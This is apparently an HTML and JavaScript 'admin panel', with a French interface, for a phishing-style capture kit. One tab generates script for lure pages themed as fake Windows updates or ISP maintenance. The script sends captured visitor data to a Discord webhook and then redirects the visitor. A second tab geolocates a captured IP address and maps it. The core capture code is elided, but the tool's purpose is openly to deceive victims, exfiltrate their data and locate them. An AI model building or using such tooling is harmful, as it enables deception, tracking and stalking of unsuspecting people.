<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>ORCA ADMIN PANEL</title>
    <style>
        :root { --neon: #00ff41; --bg: #0a0a0a; }
        body { background: var(--bg); color: var(--neon); font-family: monospace; padding: 20px; }
        .container { max-width: 900px; margin: auto; border: 1px solid var(--neon); padding: 20px; box-shadow: 0 0 20px rgba(0,255,65,0.1); }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
        .tab { cursor: pointer; padding: 10px; border: 1px solid #333; transition: 0.3s; }
        .tab.active { background: var(--neon); color: #000; font-weight: bold; }
        .section { display: none; }
        .section.active { display: block; }
        input, select, button { background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 10px; margin: 10px 0; width: 100%; box-sizing: border-box; }
        button { cursor: pointer; font-weight: bold; text-transform: uppercase; }
        button:hover { background: var(--neon); color: #000; }
        pre { background: #050505; padding: 15px; border: 1px dashed #333; overflow-x: auto; color: #888; font-size: 12px; }
        .result-card { border: 1px solid #333; padding: 15px; margin-top: 20px; background: #0e0e0e; }
    </style>
</head>
<body>

<div class="container">
    <h1>ORCA_MULTI-TOOL_V1.0</h1>
    
    <div class="tabs">
        <div class="tab active" onclick="openTab('gen')">üîó GENERATOR</div>
        <div class="tab" onclick="openTab('osint')">üîç OSINT SCANNER</div>
    </div>

    <div id="gen" class="section active">
        <h3>G√©n√©rateur de Lien de Capture</h3>
        <label>URL du Webhook Discord :</label>
        <input type="text" id="wh-url" placeholder="https://discord.com/api/webhooks/...">
        
        <label>Th√®me du site :</label>
        <select id="theme">
            <option value="terminal">Cyber Terminal (V5)</option>
            <option value="win">Fausse Mise √† jour Windows</option>
            <option value="wifi">Maintenance FAI / WiFi</option>
        </select>

        <label>Redirection apr√®s capture (ex: google.com) :</label>
        <input type="text" id="redir" value="https://www.google.com">

        <button onclick="generateCode()">G√©n√©rer le code HTML</button>
        
        <h4>Code √† copier dans index.html :</h4>
        <pre id="output-code">Le code appara√Ætra ici...</pre>
    </div>

    <div id="osint" class="section">
        <h3>OSINT IP Scanner</h3>
        <input type="text" id="ip-input" placeholder="Entrez l'IP captur√©e (ex: 8.8.8.8)">
        <button onclick="scanIP()">Lancer l'Analyse OSINT</button>

        <div id="osint-result" class="result-card" style="display:none;">
            </div>
    </div>
</div>

<script>
    function openTab(id) {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
        event.currentTarget.classList.add('active');
        document.getElementById(id).classList.add('active');
    }

    // LOGIQUE GENERATOR
    function generateCode() {
        const wh = document.getElementById('wh-url').value;
        const theme = document.getElementById('theme').value;
        const redir = document.getElementById('redir').value;

        // Ici on pourrait injecter tout ton code V5 avec les variables modifi√©es
        const code = `\n<script>\nconst WEBHOOK = "${wh}";\nconst REDIRECT = "${redir}";\n// ... le reste du code ORCA ...\n<\/script>`;
        document.getElementById('output-code').innerText = code;
        alert("Code g√©n√©r√© ! Copie-le dans ton fichier index.html");
    }

    // LOGIQUE OSINT
    async function scanIP() {
        const ip = document.getElementById('ip-input').value;
        const resBox = document.getElementById('osint-result');
        if(!ip) return alert("Entrez une IP");

        resBox.style.display = "block";
        resBox.innerHTML = "Analyse en cours...";

        try {
            const res = await fetch(`https://ipapi.co/${ip}/json/`);
            const d = await res.json();
            
            resBox.innerHTML = `
                <strong style="color:var(--neon)">RAPPORT POUR : ${d.ip}</strong><br><br>
                üìç <b>Localisation :</b> ${d.city}, ${d.region}, ${d.country_name}<br>
                üì° <b>Fournisseur (ISP) :</b> ${d.org}<br>
                üåê <b>Type :</b> ${d.version}<br>
                ‚è∞ <b>Fuseau Horaire :</b> ${d.timezone}<br>
                üó∫Ô∏è <a href="https://www.google.com/maps?q=${d.latitude},${d.longitude}" target="_blank" style="color:var(--neon)">Voir sur Google Maps</a>
            `;
        } catch(e) {
            resBox.innerHTML = "Erreur lors du scan OSINT.";
        }
    }
</script>

</body>
</html>
